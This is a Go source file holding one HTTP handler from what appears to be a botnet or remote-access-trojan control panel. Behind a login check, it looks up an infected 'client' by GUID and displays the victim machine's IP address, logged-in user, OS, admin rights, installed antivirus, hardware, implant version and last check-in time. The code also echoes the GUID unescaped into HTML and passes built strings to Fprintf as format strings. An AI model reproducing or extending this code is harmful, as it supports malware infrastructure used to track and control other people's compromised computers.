/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server
//------------------------------------------------------------
import (
	"strings"
	"fmt"
	"io"
	"net/http"
	"database/sql"
)
//------------------------------------------------------------
func InfoHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := GetUserName(request)
		if userName != "" {
			request.ParseForm()
			GUID := request.Form.Get("guid")

			var tmpguid string

			err := DBPointer.QueryRow("SELECT guid FROM clients WHERE guid=?", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No entry by GUID found")
				result := r.Replace(ErrorHTML)
				fmt.Fprintf(response, result)
			} else {
				var tmpip string
				var tmpwhoami string
				var tmpos string
				var tmpinstall string
				var tmpisadmin string
				var tmpav string
				var tmpcpu string
				var tmpgpu string
				var tmpver string
				var tmplastcheck string

				err := DBPointer.QueryRow("SELECT ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin FROM clients WHERE guid=?", GUID).Scan(&tmpip, &tmpwhoami, &tmpos, &tmpinstall, &tmpisadmin, &tmpav, &tmpcpu, &tmpgpu, &tmpver, &tmplastcheck)
				if err != nil {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
					result := r.Replace(ErrorHTML)
					fmt.Fprintf(response, result)
				}

				r := strings.NewReplacer("{STATS}", createcountDiv(), "{GUID}", GUID, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpisadmin, "{AV}", tmpav, "{LASDATE}", tmplastcheck, "{INSDATE}", tmpinstall, "{CPU}", tmpcpu, "{GPU}", tmpgpu, "{VERSION}", tmpver)
				result := r.Replace(InfoHTML)

				rr := strings.NewReader(result)
				io.Copy(response, rr)
			}
		} else {
			fmt.Fprintf(response, LoginHTML)
		}
	}
}
//------------------------------------------------------------
